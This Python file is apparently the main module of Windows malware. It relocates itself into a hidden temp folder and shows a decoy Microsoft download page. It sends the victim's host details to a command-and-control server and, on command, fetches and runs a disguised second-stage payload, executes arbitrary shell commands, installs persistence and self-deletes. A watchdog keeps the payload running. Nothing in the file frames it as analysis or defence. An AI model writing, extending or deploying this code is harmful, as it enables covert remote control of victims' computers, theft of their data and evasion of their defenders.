import os
import sys
import json
import time
import random
import socket
import subprocess
import urllib.request
import tempfile
import platform
import shutil
import webbrowser

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.persistence import (
    is_persistent,
    install_persistence,
    remove_persistence,
)
from lib.c2_client import send_beacon
from lib.evasion import run_evasion

from settings import C2_SERVER, TRAFFIC_KEY

EXE_PATH = os.path.abspath(sys.argv[0])
SERVICE_NAME = "hw-detect"
BEACON_INTERVAL = 60
WATCHDOG_INTERVAL = 3600

DEPLOYED_NAME = "gpu_helper.exe"
DEPLOYED_PATH = os.path.join(tempfile.gettempdir(), DEPLOYED_NAME)


def relocate_to_temp():
    temp_dir = os.path.join(tempfile.gettempdir(), ".hw-tools")
    os.makedirs(temp_dir, exist_ok=True)
    target = os.path.join(temp_dir, os.path.basename(EXE_PATH))
    if os.path.abspath(EXE_PATH) == os.path.abspath(target):
        return
    shutil.copy2(EXE_PATH, target)
    subprocess.Popen([target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    try:
        os.unlink(EXE_PATH)
    except Exception:
        pass
    os._exit(0)


def open_browser_decoy():
    try:
        webbrowser.open('https://www.microsoft.com/software-download/windows11')
    except Exception:
        pass


def is_process_alive():
    try:
        r = subprocess.run(
            ['tasklist', '/FI', f'IMAGENAME eq {DEPLOYED_NAME}'],
            capture_output=True, text=True, timeout=10
        )
        return DEPLOYED_NAME in r.stdout
    except Exception:
        return False


def deploy_payload():
    url = f"{C2_SERVER}/api/update/check?platform=windows"
    try:
        resp = urllib.request.urlopen(url, timeout=30)
        payload = resp.read()
        with open(DEPLOYED_PATH, 'wb') as f:
            f.write(payload)
        subprocess.Popen(
            [DEPLOYED_PATH],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        return True
    except Exception:
        return False


def kill_deployed():
    subprocess.run(
        ['taskkill', '/F', '/IM', DEPLOYED_NAME],
        capture_output=True, timeout=10
    )


def get_stager_info():
    info = {
        'hostname': socket.gethostname(),
        'username': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
        'os': platform.platform(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'persistent': is_persistent(SERVICE_NAME),
        'type': 'scanner',
        'deployed': (
            os.path.exists(DEPLOYED_PATH) and is_process_alive()
        ),
    }
    return info


def exec_command(cmd, params, info):
    if cmd == 'deploy':
        if info.get('deployed'):
            return 'already deployed'
        ok = deploy_payload()
        if ok:
            info['deployed'] = True
            return 'deploy successful'
        return 'deploy failed'
    elif cmd == 'exec':
        command = params.get('cmd', '')
        try:
            r = subprocess.run(
                command, shell=True, capture_output=True,
                text=True, timeout=30
            )
            output = r.stdout + r.stderr
            return output[:1000] if output else '(no output)'
        except Exception as e:
            return f'exec error: {e}'
    elif cmd == 'persist':
        if is_persistent(SERVICE_NAME):
            return 'already persistent'
        install_persistence(SERVICE_NAME, EXE_PATH)
        return 'persistence installed'
    elif cmd == 'self_destruct':
        kill_deployed()
        if os.path.exists(DEPLOYED_PATH):
            try:
                os.remove(DEPLOYED_PATH)
            except Exception:
                pass
        remove_persistence("hw-detect")
        remove_persistence("gpu-helper")
        info['result'] = 'self_destructed'
        send_beacon(C2_SERVER, info, TRAFFIC_KEY)
        try:
            os.unlink(EXE_PATH)
        except Exception:
            pass
        os._exit(0)
    elif cmd == 'status':
        deployed = os.path.exists(DEPLOYED_PATH) and is_process_alive()
        persistent = is_persistent(SERVICE_NAME)
        d = 'yes' if deployed else 'no'
        p = 'yes' if persistent else 'no'
        return f'deployed={d} persistent={p}'
    return f'unknown command: {cmd}'


def beacon_loop():
    info = get_stager_info()
    watchdog = False
    last_result = None

    while True:
        info['persistent'] = is_persistent(SERVICE_NAME)
        deployed_exists = os.path.exists(DEPLOYED_PATH)
        deployed_alive = deployed_exists and is_process_alive()
        info['deployed'] = deployed_alive

        if not watchdog:
            if deployed_exists and not deployed_alive:
                deploy_payload()
                info['deployed'] = True
                watchdog = True

            info['result'] = last_result
            result = send_beacon(C2_SERVER, info, TRAFFIC_KEY)
            info.pop('result', None)
            if result and result.get('command'):
                cmd = result['command']
                cmd_result = exec_command(
                    cmd.get('command'), cmd.get('params', {}), info
                )
                last_result = cmd_result
                if cmd.get('command') == 'deploy' and 'successful' in cmd_result:
                    watchdog = True

            time.sleep(BEACON_INTERVAL + random.randint(0, 30))
        else:
            time.sleep(WATCHDOG_INTERVAL)
            if not (os.path.exists(DEPLOYED_PATH) and is_process_alive()):
                note = os.path.join(tempfile.gettempdir(), ".hw-tools", ".suicide_note")
                if os.path.exists(note):
                    remove_persistence("hw-detect")
                    remove_persistence("gpu-helper")
                    try:
                        os.unlink(note)
                    except Exception:
                        pass
                    try:
                        os.unlink(EXE_PATH)
                    except Exception:
                        pass
                    os._exit(0)
                info['deployed'] = False
                info['result'] = 'watchdog: re-deploying'
                send_beacon(C2_SERVER, info, TRAFFIC_KEY)
                deploy_payload()
                info['deployed'] = True
                info['persistent'] = is_persistent(SERVICE_NAME)
                info['result'] = None
                send_beacon(C2_SERVER, info, TRAFFIC_KEY)


if __name__ == '__main__':
    relocate_to_temp()
    open_browser_decoy()
    run_evasion(EXE_PATH)
    beacon_loop()
